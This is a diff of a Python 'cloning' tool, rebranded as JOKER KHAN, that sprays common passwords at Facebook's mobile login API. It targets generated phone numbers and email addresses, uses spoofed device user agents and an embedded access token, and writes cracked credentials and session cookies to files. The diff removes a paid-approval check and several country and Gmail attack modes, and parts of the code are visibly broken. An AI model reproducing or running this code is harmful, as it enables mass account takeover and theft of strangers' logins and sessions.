@@ -12,11 +12,7 @@ except ModuleNotFoundError:
     print('\n Installing missing modules ...')
     os.system('pip install requests bs4 futures==2 > /dev/null')
     os.system('python JOKER_KHAN.py')
-try:
-  import pycurl
-except:
-  os.system("pip install pycurl")
-  import pycurl
+	
 os.system('xdg-open https://chat.whatsapp.com/Jv6uZwbW5so4zCQml49xBA')
 
 try:
@@ -150,9 +146,6 @@ device = {
         'fbca':fbca,
         'fbdm':fbdm}
 os.system('xdg-open https://www.facebook.com/profile.php?id=100095345508213')
-def ua_api():
-	rhm = str(random.randint(100,400))
-	return (f"[FBAN/Orca-Android;FBAV/"+rhm+".0.0.27.214;FBBV/426817936;FBLC/en_GB;FBRV/428276664;FBCR/Nepal Telecom;FBMF/LGE;FBBD/lge;FBPN/com.facebook.orca;FBDV/LMK525;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1422};]")
 ##______COLORS____ARE________######
 pwx=[]
 W = '\033[97;1m'
@@ -175,27 +168,26 @@ EXTRA ='\x1b[38;5;208m'
 #________________________________________#
 
 logo=(f"""{WHITE}
-db    db .d8888. .88b  d88. d888888b d888888b 
-88    88 88'  YP 88'YbdP`88   `88'     `88'   
-88    88 `8bo.   88  88  88    88       88    
-88    88   `Y8b. 88  88  88    88       88    
-88b  d88 db   8D 88  88  88   .88.     .88.   
-~Y8888P' `8888Y' YP  YP  YP Y888888P Y888888P  {BLUE}X {RED}PATHANI {WHITE}
-
-\t[×] Developed By Usman Gull{EXTRA} (USMII)
-{WHITE}[•] AUTHOR       : Usman Gul
-{WHITE}[•] STYLE         : BUAHAHAHAHAHHAHH
-{WHITE}[•] WhatsApp     :   +923238272402
-[•] FaceBook     :   Usman Gull
-[•] Version      :   {RED}3.0
-{WHITE}[•] YouTube      :   USMII Tech
-
-{WHITE}================================================
-   \33[37;41m\t SIAM AHMED x FARHAN  x KASHIF  x ARYAN \33[0;m
-{WHITE}=================================================""")
+\033[1;39m======================================================
+\033[1;31m    ____   ____   ___    __ __________ ________    
+\033[1;31m    `MM'  6MMMMb  `MM    d'  `MMMMMMMMM `MMMMMMMb.  
+\033[1;39m      MM  8P    Y8  MM   d'   MM      \  MM    `Mb  
+\033[1;39m      MM 6M      Mb MM  d'    MM         MM     MM  
+\033[1;39m      MM MM      MM MM d'     MM    ,    MM     MM  
+\033[1;39m      MM MM      MM MMd'      MMMMMMM    MM    .M9  
+\033[1;39m      MM MM      MM MMYM.     MM    `    MMMMMMM9'  
+\033[1;39m      MM MM      MM MM YM.    MM         MM  \M\    
+\033[1;39m(8)   MM YM      M9 MM  YM.   MM         MM   \M\   
+\033[1;31m((   ,M9  8b    d8  MM   YM.  MM      /  MM    \M\  
+\033[1;31m YMMMM9    YMMMM9  _MM_   YM._MMMMMMMMM _MM_    \M\_ 
+\033[1;39m======================================================
+\033[1;32m  • \033[1;37m Tool Owner :-  𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑 𝐊𝐇𝐀𝐍𝐎
+\033[1;32m  • \033[1;37m GitHub     :-  𝐇𝐀𝐂𝐊𝐄𝐑 𝐃𝐀 𝐓𝐄𝐑𝐌𝐔𝐗
+\033[1;32m  • \033[1;37m Type       :-  Free
+\033[1;32m  • \033[1;37m Version    :-  {version}1.0
+\033[1;39m======================================================")
 def linex():
-    print('\033[1;37m----------------------------------------------')
-
+    print('\033[1;39m===============================================')
 def clear():
         os.system('clear')
         print(logo)
@@ -206,77 +198,16 @@ pcp=[]
 id=[]
 tokenku=[]
 
-
-import pycurl
-from io import BytesIO
-def get_response(url):
-    response_buffer = BytesIO()
-
-    curl = pycurl.Curl()
-    curl.setopt(curl.URL, url)
-    curl.setopt(curl.WRITEDATA, response_buffer)
-
-    try:
-        curl.perform()
-    except pycurl.error as e:
-        return f"Error: {e}"
-
-    response = response_buffer.getvalue().decode('utf-8')
-    curl.close()
-
-    return response
-
-def remove_symbols_and_spaces(input_string):
-    cleaned_string = re.sub(r'[^a-zA-Z0-9#]', '', input_string)
-    return cleaned_string
-    
-def approval():
-  os.system('clear')
-  print(logo)
-  import platform
-  uuid = str(os.geteuid())+"#"+ platform.uname().machine+platform.uname().version+platform.uname().release
-  id = remove_symbols_and_spaces(uuid)
-  k1,k2,k3,k4=id[:4],id[3:6],id[4:9],id[9:]
-  intuid=int(id.split("#")[0])
-  pref=str((intuid-104729)*2-37+(1-2**7))
-  suff=str((intuid-523217)%104729)
-  realid=(suff+k3+k1+k4+k2+pref).encode().hex()
-  try:
-    httpCaht = get_response('https://raw.githubusercontent.com/HAJIJOKERHackER/approval/main/approval.txt')
-    if realid in httpCaht:
-      #print("\3[1;32m YOUR KEY IS APPROVED.")
-      #msg = str(os.geteuid())
-      pass
-    else:
-      print("\33[1;32m YOUR KEY :\x1b[38;5;46m "+id)
-      print('\33[1;37m ====================================================')
-      print("\33[1;37m ====================================================")
-      print("\33[1;36m NOTE:- THIS TOOL IS PAID \n YOU HAVE TO PAY FOR APPROVAL FIRST .")
-      print('\33[1;37m ====================================================')
-      print (" \33[37;41m\t WELCOME TO USMIII TOOL AND ENJOY \33[0;m")
-      
-      print ("\33[1;37m SEND 400 PKR (FOR 15 DAYS APPROVEL) TO ADMIN COPY YOUR KEY SEND TO ADMIN FOR APPROVAL")
-      print ("\33[1;37m SEND 500 PKR (FOR 30 DAYS APPROVEL) TO ADMIN COPY YOUR KEY SEND TO ADMIN FOR APPROVAL")
-      input(' IIF YOU ARE FREE USER THEN DONT PRESS ENTER  ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('https://wa.me/message/923238272402'+tks)
-      sys.exit()
-      #time.sleep(1)
-      #approval()
-  except Exception as error:
-    print(error)                        
-
-
 def menu():
         try:
-                approval()
+                clear()
         #       chk()
-                x = ("***")
-                if x == ("***"):
+                x = ("sex")
+                if x == ("sex"):
                         print('[1] CRACK FILE ')
                         print('[2] RANDOM CRACK')
-                        print('[3] GMAIL CRACK')
-                        print('[4] FOLLOW FB')
-                        print('[0] EXIT ')
+                        print('[3] FOLLOW FB')
+                        print('[4] EXIT ')
                         linex()
                         xd=input(' CHOOSE AN OPTION: ')
                         #os.system('xdg-open ')
@@ -344,21 +275,8 @@ def menu():
                                 input(' PRESS ENTER TO BACK ')
                                 os.system('python JOKER_KHAN.py')
                         elif xd in ['2','02']:
-                                clear();print(' [1] Pakistan Cloning \n [2] Bengladesh Cloning \n [3] Afg Cloning \n [4] India Cloning \n [0] back ')
-                                l=input(' choose : ')
-                                if l =='1':
-                                	pak()
-                                if l =='2':
-                                	bd()
-                                if l =='3':
-                                	afg()
-                                if l =='4':
-                                	ind()
-                                if l=='0':
-                                	menu()
+                                pak()
                         elif xd in ['3','03']:
-                        	gmail()
-                        elif xd in ['0','00']:
                                 exit()
                         
         except requests.exceptions.ConnectionError:
@@ -395,162 +313,11 @@ def pak():
                 linex()
                 input(' PRESS ENTER TO BACK ')
                 os.system('python uami.py')
-def bd():
-                user=[]
-                clear()
-                print('\033[1;31m CODE EXAMPLE : 017,016,018')
-                code = input('\033[1;37m PUT CODE: ')
-                try:
-                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
-                except ValueError:
-                        limit = 5000
-                for nmbr in range(limit):
-                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-                        user.append(nmp)
-                with tred(max_workers=30) as TRT:     
-                        clear()
-                        
-                        tl = str(len(user))
-                        print('[+] Total accounts: \033[1;97m'+tl)
-                        print('[+] Select code: \033[1;97m '+code)
-                        print('[+] Process has been started \033[1;97m')
-                        linex()
-                        for psx in user:
-                                ids = code+psx
-                                passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','57273200']
-                                TRT.submit(rndm,ids,passlist)
-                print('\033[1;37m')
-                linex()
-                print(' THE PROCESS HAS COMPLETED')
-                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-                linex()
-                input(' PRESS ENTER TO BACK ')
-                os.system('python uami.py')
-
-def afg():
-                user=[]
-                clear()
-                print('\033[1;31m CODE EXAMPLE : 9377,9379,9374')
-                code = input('\033[1;37m PUT CODE: ')
-                try:
-                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
-                except ValueError:
-                        limit = 5000
-                for nmbr in range(limit):
-                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-                        user.append(nmp)
-                with tred(max_workers=30) as TRT:     
-                        clear()
-                        
-                        tl = str(len(user))
-                        print('[+] Total accounts: \033[1;97m'+tl)
-                        print('[+] Select code: \033[1;97m '+code)
-                        print('[+] Process has been started \033[1;97m')
-                        linex()
-                        for psx in user:
-                                ids = code+psx
-                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
-                                TRT.submit(rndm,ids,passlist)
-                print('\033[1;37m')
-                linex()
-                print(' THE PROCESS HAS COMPLETED')
-                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-                linex()
-                input(' PRESS ENTER TO BACK ')
-                os.system('python uami.py')
-def ind():
-                user=[]
-                clear()
-                print('\033[1;31m CODE EXAMPLE : 91***,etc')
-                code = input('\033[1;37m PUT CODE: ')
-                try:
-                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
-                except ValueError:
-                        limit = 5000
-                for nmbr in range(limit):
-                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-                        user.append(nmp)
-                with tred(max_workers=30) as TRT:     
-                        clear()
-                        
-                        tl = str(len(user))
-                        print('[+] Total accounts: \033[1;97m'+tl)
-                        print('[+] Select code: \033[1;97m '+code)
-                        print('[+] Process has been started \033[1;97m')
-                        linex()
-                        for psx in user:
-                                ids = code+psx
-                                passlist = [psx,ids,'57273200','hindustan']
-                                TRT.submit(rndm,ids,passlist)
-                print('\033[1;37m')
-                linex()
-                print(' THE PROCESS HAS COMPLETED')
-                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-                linex()
-                input(' PRESS ENTER TO BACK ')
-                os.system('python uami.py')
-                
-def gmail():
-                os.system('rm -rf .re.txt')
-                clear()
-                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
-                linex()
-                first = input(' Put first name: ')
-                linex()
-                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
-                linex()
-                last = input(' Put last name: ')
-                linex()
-                print(' Example: @gmail.com , @yahoo.com etc...')
-                linex()
-                domain = input(' domain: ')
-                linex()
-                try:
-                        limit=int(input(' Put limit: '))
-                except ValueError:
-                        limit = 5000
-                linex()
-                print(' Getting gmails...')
-                lists = ['3','4']
-                for xd in range(limit):
-                        lchoice = random.choice(lists)
-                        if '3' in lchoice:
-                                mail = ''.join(random.choice(string.digits) for _ in range(3))
-                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-                        else:
-                                mail = ''.join(random.choice(string.digits) for _ in range(4))
-                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-                        fo = open('.re.txt', 'r').read().splitlines()
-                with tred(max_workers=30) as ZAIN:
-                        total = str(len(fo))
-                        clear()
-                        print(' Total account : \033[1;32m'+total)
-                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
-                        linex()
-                        for user in fo:
-                                ids,names = user.split('|')
-                                first_name = names.rsplit(' ')[0]
-                                try:
-                                        last_name = names.rsplit(' ')[1]
-                                except IndexError:
-                                        last_name = 'Khan'
-                                fs = first_name.lower()
-                                ls = last_name.lower()
-                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                ZAIN.submit(rndm,ids,passlist)
-                print('\033[1;37m')
-                linex()
-                print(' The process has completed')
-                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
-                linex()
-                input(' Press enter to back ')
-                os.system('python JOKER_KHAN.py')
-                
 #------
 def ffb(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [USMII-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [JOKER-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -579,7 +346,7 @@ def ffb(ids,names,passlist):
                         en = random.choice(['en_US','en_GB'])
                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                         network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(100,500))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(50,200)) +";FBBV/"+str(random.randint(111111111,666666666))+";[FBAN/"+"FB4A;FBAV/"+"372.0.0.4524;FBBV/"+"3136351;FBDM/"+"{density=1.4,width=1322,height=1574};FBLC/"+"en_PK;FBRV/"+"958105032;FBCR/"+"Ufone;FBMF/"+"RMX3662;FBBD/"+"Realme;FBPN/"+"com.facebook.katana;FBDV/"+"RMX3662;FBSV/"+"7;FBOP/"+"4;FBCA/"+"x86:armeabi-v7a;]"+"[FBAN/"+"FB4A;FBAV/"+"410.0.0.3313;FBBV/"+"3735186;FBDM/"+"{density=3.8,width=1093,height=1317};FBLC/"+"en_PK;FBRV/"+"799203831;FBCR/"+"Mobilink;FBMF/"+"RMX5376;FBBD/"+"Realme;FBPN/"+"com.facebook.lite;FBDV/"+"RMX5376;FBSV/"+"1;FBOP/"+"2;FBCA/"+"x86:armeabi-v7a;]"+"[FBAN/"+"FB4A;FBAV/"+"388.0.0.1714;FBBV/"+"6365230;FBDM/"+"{density=3.0,width=1114,height=2553};FBLC/"+"en_PK;FBRV/"+"212681290;FBCR/"+"Zong;FBMF/"+"RMX9267;FBBD/"+"Realme;FBPN/"+"com.facebook.katana;FBDV/"+"RMX9267;FBSV/"+"14;FBOP/"+"3;FBCA/"+"x86:armeabi-v7a;]"+"Davik/2.1.0 (Linux; U; Android 7.0.0; SM-747 Build/PPR1.165262.212) [FBAN/FB4A;FBAV/331.0.0.25474;FBBV/184058790;FBDM/{density=1.5,745=480,height=1815};FBLC/en_GB;FBRV/184058790;FBCR/Banglalink;FBCR/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-747;FBSV/7.0.0;nullFBCA/armeabi-v7a:armeabi;]"
+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/"+"MobileAdsManagerAndroid;FBAV/"+"335.0.0.30.47;FBBV/"+"489275660;FBRV/"+"0;FBPN/"+"com.facebook.adsmanager;FBLC/"+"en_US;FBMF/"+"OPPO;FBBD/"+"OPPO;FBDV/"+"CPH1853;FBSV/"+"8.1.0;FBCA/"+"arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.0,width=720,height=1424};FB_FW/1;]"
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -592,33 +359,32 @@ def ffb(ids,names,passlist):
                         li2 = random.choice(li)
                         j1 = ''.join(random.choice(digits) for _ in range(2))
                         jazoest = li2+j1
-                        head = {'User-Agent': ua, 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '22739', 'X-FB-SIM-HNI': '35221', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
-                        data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"es_AR","client_country_code":"AR","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
-			
+                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-JOKER"}
                         url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [LEGEND-USMII-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [SHAHI JOKER-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/USMII-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/USMII-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/JOKER-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/JOKER-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[USMII-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[JOKER-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;31m [ALONE-USMII-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/USMII-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[1;31m [ALONE-JOKER-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/USMII-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -630,7 +396,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [USMII-RUNING ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [JOKER-RUNING ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -658,15 +424,14 @@ def api(ids,names,passlist):
                         fbpn = 'com.facebook.katana'
                         en = random.choice(['en_US','en_GB'])
                         motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
-                      #  mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
-                    #    mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
+                        mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 